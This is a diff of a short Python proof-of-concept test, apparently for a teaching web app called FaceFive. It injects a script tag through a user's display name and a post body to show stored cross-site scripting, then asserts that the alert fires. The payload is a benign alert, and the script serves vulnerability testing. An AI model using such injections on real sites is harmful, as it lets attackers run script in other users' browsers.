@@ -1,8 +1,8 @@
-# vuln3.py
+# vuln6.py
 
 # PoC for Cross-Site Scripting on the /create_post endpoint
 #
-# When creating a new post, an attack insert a script in the content area which will run to all users viewing the post
+# It is possible to change a user's name to a script, which will run when their name is displayed, including when they create a new post.
 
 from tools import *
 import sys
@@ -16,10 +16,12 @@ session = FaceFiveSession(url)
 
 user = 'test'
 passwd = 'testpasswd'
-content = '<script>alert(1);</script>'
+content = '<script>alert(5);</script>'
 
 reset_image(session)
 register(session, user, passwd)
+update_user_script(session, passwd, user, name=content)
 
 alertText = create_post_script(session, content)
-assert "1" in alertText
+assert "5" in alertText
+
